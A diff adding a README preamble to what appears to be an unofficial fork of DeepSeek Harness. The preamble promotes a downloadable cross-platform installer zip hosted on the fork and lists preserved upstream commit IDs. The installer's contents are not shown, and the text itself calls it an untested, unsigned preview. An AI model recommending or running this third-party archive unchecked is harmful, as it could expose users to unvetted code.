@@ -1,3 +1,56 @@
+# DeepSeek Harness — Installer and Source Preservation
+
+**Repository Update: 13 October 2026**
+
+This repository serves two purposes: **hosting and distributing installers for DeepSeek Harness**, and preserving an identifiable snapshot of the original DeepSeek Harness source code developed by DeepSeek AI.
+
+## 🚀 DeepSeek Harness Installer — New Addition
+
+A cross-platform **DeepSeek Harness Installer Kit (v1.0)** has been introduced to simplify downloading, installing, configuring, running, repairing, and uninstalling DeepSeek Harness without requiring users to perform the entire setup manually.
+
+**📦 [Download DeepSeek Harness Installer Kit v1.0](https://github.com/AonzOG/deepseek-harness-d743267/blob/master/installers/DeepSeek-Harness-Installer-Kit-v1.0.zip)**
+
+The installer provides three source-selection options:
+
+1. **Official DeepSeek Repository:** https://github.com/deepseek-ai/deepseek-harness — Install from the original upstream project.
+2. **Preserved Repository:** https://github.com/AonzOG/deepseek-harness-d743267 — Install from this repository, which preserves the identified upstream snapshot and hosts the installer.
+3. **Custom Repository URL:** Paste the URL of another compatible public GitHub repository, including independent forks or imported copies of DeepSeek Harness.
+
+The installer kit supports Windows, macOS, and Linux through platform-specific installation scripts and a shared installation engine. It provides source retrieval, dependency setup, application building, launching, and managed Repair and Uninstall operations.
+
+**Development status:** The installer kit is an initial source-build preview. Native operating-system installation and application acceptance testing remain outstanding. It should not be confused with a signed, precompiled desktop installer.
+
+## 📌 Preservation of the Original DeepSeek Harness Source Code
+
+This repository also imports and preserves the original DeepSeek Harness source code at the following upstream Git commit:
+
+**Original Repository:** https://github.com/deepseek-ai/deepseek-harness
+
+**Preserved Commit ID:**
+`d743267388641bc76f17c45ce8b4c231aed1d32c`
+
+**Upstream Commit Date:** 9 October 2026, 09:31 UTC (9:31 PM Fiji Time)
+
+**Upstream Version:** `v0.2.1-alpha.2`
+
+**Original Commit:** https://github.com/deepseek-ai/deepseek-harness/commit/d743267388641bc76f17c45ce8b4c231aed1d32c
+
+The preserved commit establishes a traceable historical baseline of the upstream project, allowing future development, modifications, bug fixes, security improvements, and installer updates to be distinguished from the original imported source.
+
+The first installer package was subsequently added on 13 October 2026 under commit:
+
+`7e5cc1e76402e21be1dd8916c32c46e7f719e4b7`
+
+Consequently, this repository's current HEAD may differ from the preserved upstream commit while retaining that original commit in its Git history.
+
+The original DeepSeek Harness source, attribution, and applicable licensing remain preserved. Installer development is maintained as an additional capability rather than a replacement of the upstream application.
+
+---
+
+**The original DeepSeek Harness README continues below, preserved for reference, technical documentation, and attribution.**
+
+---
+
 # DeepSeek Harness
 
 English | [中文](README.zh.md)
